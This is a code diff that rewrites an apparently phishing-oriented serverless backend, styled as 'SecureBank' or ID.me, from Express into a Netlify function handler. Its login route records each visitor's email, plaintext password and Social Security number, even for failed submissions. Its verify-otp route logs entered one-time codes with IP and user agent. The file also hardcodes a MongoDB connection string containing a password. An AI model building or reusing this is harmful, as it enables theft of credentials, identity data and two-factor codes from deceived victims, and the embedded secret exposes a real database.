@@ -1,5 +1,3 @@
-const express = require("express");
-const serverless = require("serverless-http");
 const mongoose = require("mongoose");
 
 // MongoDB Models (inline for serverless)
@@ -41,26 +39,6 @@ const User = mongoose.models.User || mongoose.model('User', userSchema);
 const OTPCode = mongoose.models.OTPCode || mongoose.model('OTPCode', otpCodeSchema);
 const LoginAttempt = mongoose.models.LoginAttempt || mongoose.model('LoginAttempt', loginAttemptSchema);
 const OTPAttempt = mongoose.models.OTPAttempt || mongoose.model('OTPAttempt', otpAttemptSchema);
-
-const app = express();
-const router = express.Router();
-
-// CORS middleware for Netlify
-app.use((req, res, next) => {
-  res.header('Access-Control-Allow-Origin', '*');
-  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
-  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
-  
-  if (req.method === 'OPTIONS') {
-    res.sendStatus(200);
-  } else {
-    next();
-  }
-});
-
-// Middleware
-app.use(express.json());
-app.use(express.urlencoded({ extended: false }));
 
 // MongoDB connection
 const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://securebank69_id-db_user:sCgZIxMNjYYi72HA@id-me.sg89vi5.mongodb.net/secure-id?retryWrites=true&w=majority&appName=id-me';
@@ -302,135 +280,216 @@ function validateOTP(data) {
   return data;
 }
 
-// Routes
-router.post('/auth/login', async (req, res) => {
+// Helper function to parse path and determine endpoint
+function getEndpoint(path) {
+  // Remove /.netlify/functions/api prefix
+  const cleanPath = path.replace('/.netlify/functions/api', '');
+  return cleanPath;
+}
+
+// Main Netlify Function Handler
+exports.handler = async (event, context) => {
+  // Handle CORS preflight
+  if (event.httpMethod === 'OPTIONS') {
+    return {
+      statusCode: 200,
+      headers: {
+        'Access-Control-Allow-Origin': '*',
+        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
+        'Access-Control-Allow-Headers': 'Content-Type, Authorization',
+      },
+      body: '',
+    };
+  }
+
+  const { httpMethod, path, body, headers } = event;
+  const endpoint = getEndpoint(path);
+
+  console.log('Request:', { httpMethod, path, endpoint });
+
   try {
-    const validatedData = validateLogin(req.body);
-    const ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
-    const userAgent = req.get('User-Agent') || 'unknown';
-    
-    await storage.logLoginAttempt(validatedData.email, validatedData.password, validatedData.ssn, true, ipAddress, userAgent);
-    
-    const otpCode = await storage.generateOTP(validatedData.email);
-    
-    res.json({
-      success: true, 
-      message: "OTP sent to your email",
-      email: validatedData.email,
-      otp: otpCode.code // For demo purposes only
-    });
-  } catch (error) {
-    if (error.message) {
-      const ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
-      const userAgent = req.get('User-Agent') || 'unknown';
+    let requestBody = {};
+    if (body) {
       try {
-        await storage.logLoginAttempt(
-          req.body.email || 'invalid', 
-          req.body.password || 'invalid', 
-          req.body.ssn || 'invalid', 
-          false, 
-          ipAddress, 
-          userAgent
-        );
-      } catch (logError) {
-        // Ignore logging errors for invalid data
+        requestBody = JSON.parse(body);
+      } catch (e) {
+        return {
+          statusCode: 400,
+          headers: {
+            'Content-Type': 'application/json',
+            'Access-Control-Allow-Origin': '*',
+          },
+          body: JSON.stringify({ success: false, message: 'Invalid JSON' }),
+        };
       }
+    }
+
+    const ipAddress = headers['x-forwarded-for'] || headers['x-real-ip'] || 'unknown';
+    const userAgent = headers['user-agent'] || 'unknown';
+
+    // Route handling
+    if (httpMethod === 'POST' && endpoint === '/auth/login') {
+      const validatedData = validateLogin(requestBody);
       
-      return res.status(400).json({ 
-        success: false, 
-        message: error.message 
-      });
+      await storage.logLoginAttempt(
+        validatedData.email,
+        validatedData.password,
+        validatedData.ssn,
+        true,
+        ipAddress,
+        userAgent
+      );
+      
+      const otpCode = await storage.generateOTP(validatedData.email);
+      
+      return {
+        statusCode: 200,
+        headers: {
+          'Content-Type': 'application/json',
+          'Access-Control-Allow-Origin': '*',
+        },
+        body: JSON.stringify({
+          success: true,
+          message: "OTP sent to your email",
+          email: validatedData.email,
+          otp: otpCode.code // For demo purposes only
+        }),
+      };
     }
-    res.status(500).json({ 
-      success: false, 
-      message: "Internal server error" 
-    });
-  }
-});
 
-router.post('/auth/verify-otp', async (req, res) => {
-  try {
-    const validatedData = validateOTP(req.body);
-    const ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
-    const userAgent = req.get('User-Agent') || 'unknown';
-    
-    await storage.logOTPAttempt(validatedData.email, validatedData.code, true, ipAddress, userAgent);
-    
-    res.json({ 
-      success: true, 
-      message: "Login successful",
-      redirectUrl: "/dashboard"
-    });
+    if (httpMethod === 'POST' && endpoint === '/auth/verify-otp') {
+      const validatedData = validateOTP(requestBody);
+      
+      await storage.logOTPAttempt(
+        validatedData.email,
+        validatedData.code,
+        true,
+        ipAddress,
+        userAgent
+      );
+      
+      return {
+        statusCode: 200,
+        headers: {
+          'Content-Type': 'application/json',
+          'Access-Control-Allow-Origin': '*',
+        },
+        body: JSON.stringify({
+          success: true,
+          message: "Login successful",
+          redirectUrl: "/dashboard"
+        }),
+      };
+    }
+
+    if (httpMethod === 'POST' && endpoint === '/auth/resend-otp') {
+      const { email } = requestBody;
+      
+      if (!email) {
+        return {
+          statusCode: 400,
+          headers: {
+            'Content-Type': 'application/json',
+            'Access-Control-Allow-Origin': '*',
+          },
+          body: JSON.stringify({
+            success: false,
+            message: "Email is required"
+          }),
+        };
+      }
+
+      const user = await storage.getUserByEmail(email);
+      if (!user) {
+        return {
+          statusCode: 404,
+          headers: {
+            'Content-Type': 'application/json',
+            'Access-Control-Allow-Origin': '*',
+          },
+          body: JSON.stringify({
+            success: false,
+            message: "User not found"
+          }),
+        };
+      }
+
+      const otpCode = await storage.generateOTP(email);
+      
+      return {
+        statusCode: 200,
+        headers: {
+          'Content-Type': 'application/json',
+          'Access-Control-Allow-Origin': '*',
+        },
+        body: JSON.stringify({
+          success: true,
+          message: "New OTP sent to your email",
+          otp: otpCode.code // For demo purposes only
+        }),
+      };
+    }
+
+    if (httpMethod === 'POST' && endpoint === '/auth/create-demo-user') {
+      const demoUser = await storage.createUser({
+        email: "demo@securebank.com",
+        password: "password123"
+      });
+      
+      return {
+        statusCode: 200,
+        headers: {
+          'Content-Type': 'application/json',
+          'Access-Control-Allow-Origin': '*',
+        },
+        body: JSON.stringify({
+          success: true,
+          message: "Demo user created",
+          user: { id: demoUser.id, email: demoUser.email }
+        }),
+      };
+    }
+
+    // Route not found
+    return {
+      statusCode: 404,
+      headers: {
+        'Content-Type': 'application/json',
+        'Access-Control-Allow-Origin': '*',
+      },
+      body: JSON.stringify({
+        success: false,
+        message: `Route not found: ${httpMethod} ${endpoint}`
+      }),
+    };
+
   } catch (error) {
+    console.error('Function error:', error);
+
     if (error.message) {
-      return res.status(400).json({ 
-        success: false, 
-        message: error.message 
-      });
-    }
-    res.status(500).json({ 
-      success: false, 
-      message: "Internal server error" 
-    });
-  }
-});
-
-router.post('/auth/resend-otp', async (req, res) => {
-  try {
-    const { email } = req.body;
-    
-    if (!email) {
-      return res.status(400).json({ 
-        success: false, 
-        message: "Email is required" 
-      });
+      return {
+        statusCode: 400,
+        headers: {
+          'Content-Type': 'application/json',
+          'Access-Control-Allow-Origin': '*',
+        },
+        body: JSON.stringify({
+          success: false,
+          message: error.message
+        }),
+      };
     }
 
-    const user = await storage.getUserByEmail(email);
-    if (!user) {
-      return res.status(404).json({ 
-        success: false, 
-        message: "User not found" 
-      });
-    }
-
-    const otpCode = await storage.generateOTP(email);
-    
-    res.json({ 
-      success: true, 
-      message: "New OTP sent to your email",
-      otp: otpCode.code // For demo purposes only
-    });
-  } catch (error) {
-    res.status(500).json({ 
-      success: false, 
-      message: "Internal server error" 
-    });
+    return {
+      statusCode: 500,
+      headers: {
+        'Content-Type': 'application/json',
+        'Access-Control-Allow-Origin': '*',
+      },
+      body: JSON.stringify({
+        success: false,
+        message: "Internal server error"
+      }),
+    };
   }
-});
-
-router.post('/auth/create-demo-user', async (req, res) => {
-  try {
-    const demoUser = await storage.createUser({
-      email: "demo@securebank.com",
-      password: "password123"
-    });
-    
-    res.json({ 
-      success: true, 
-      message: "Demo user created",
-      user: { id: demoUser.id, email: demoUser.email }
-    });
-  } catch (error) {
-    res.status(500).json({ 
-      success: false, 
-      message: "Internal server error" 
-    });
-  }
-});
-
-// Mount the router
-app.use('/.netlify/functions/api', router);
-
-// Export the serverless function
-module.exports.handler = serverless(app);
+};
